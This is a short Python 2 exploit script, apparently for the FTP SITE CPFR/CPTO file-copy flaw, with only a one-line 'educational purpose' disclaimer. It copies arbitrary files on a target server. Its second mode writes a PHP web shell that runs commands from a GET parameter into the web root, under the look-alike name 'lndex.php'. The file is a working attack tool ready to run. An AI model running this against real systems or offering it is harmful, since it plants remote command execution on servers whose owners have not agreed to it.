'''

*** for educational purpouse ONLY! ***
c0ded by daldana. (daniel.aldana.moreno ___at__ gmail.com)

'''


import sys
from ftplib import FTP 


def main(argv):


	if len(argv) == 4:
		ip = argv[1]
		src = argv[2]
		dst = argv[3]
		option = 1

	elif len(argv) == 3:
		ip = argv[1]
		dst = argv[2]
		option = 2

	else:
		print 'please check the readme file.-'
		sys.exit(2)

	try:		
		ftp = FTP(ip)

	except:
		print 'connection refused.-'
		sys.exit(2)


	if option == 1:

		print 'YOU ARE TRYING METHOD ONE:'

		cmd1 = 'SITE CPFR ' + src
		cmd2 = 'SITE CPTO ' + dst


		try:
			res1 = ftp.sendcmd(cmd1)
		except:
			print 'NO SUCH FILE :('
			sys.exit(2)	


		try:
			res2 = ftp.sendcmd(cmd2)
			print 'NICE! TRY NOW! :)'

		except:
			print 'YOU DON\'T HAVE PERMISSION :('
			sys.exit(2)

	
	if option == 2:
		print 'YOU ARE TRYING METHOD TWO:'
		cmd1 = 'SITE CPFR /proc/self/cmdline'
		cmd2 = 'SITE CPTO /tmp/...<?php passthru($_GET[\'img\']);?>'
		cmd3 = 'SITE CPFR /tmp/...<?php passthru($_GET[\'img\']);?>'
		cmd4 = 'SITE CPTO ' + dst + '/lndex.php'
		print 'UPLOADING in ' + dst + '/lndex.php'


		try:
			res1 = ftp.sendcmd(cmd1)
		except:
			print 'NO SUCH FILE OR PERMISSION FOR CMDLINE :('
			sys.exit(2)	


		try:
			res2 = ftp.sendcmd(cmd2)
		except:
			print 'YOU DON\'T HAVE PERMISSION :('
			sys.exit(2)

		try:
			res3 = ftp.sendcmd(cmd3)
			res4 = ftp.sendcmd(cmd4)
			print 'NICE! TRY NOW! :)'

		except:
			print 'PROBLEMS ;('





if __name__ == "__main__":
	main(sys.argv)
